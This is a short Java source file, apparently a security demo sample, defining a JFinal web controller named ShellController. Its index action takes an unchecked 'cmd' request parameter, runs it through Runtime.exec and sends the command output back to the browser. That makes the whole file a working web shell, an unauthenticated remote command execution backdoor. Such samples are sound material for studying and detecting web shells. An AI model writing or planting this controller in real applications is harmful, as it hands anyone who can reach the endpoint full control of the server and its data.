package org.sec.jdemo;

import com.jfinal.core.Controller;

public class ShellController extends Controller {
    public void index() throws Exception {
        String cmd = getPara("cmd");
        Process process = Runtime.getRuntime().exec(cmd);
        StringBuilder outStr = new StringBuilder();
        java.io.InputStreamReader resultReader = new java.io.InputStreamReader(process.getInputStream());
        java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
        String s = null;
        while ((s = stdInput.readLine()) != null) {
            outStr.append(s).append("\n");
        }
        renderText(outStr.toString());
    }
}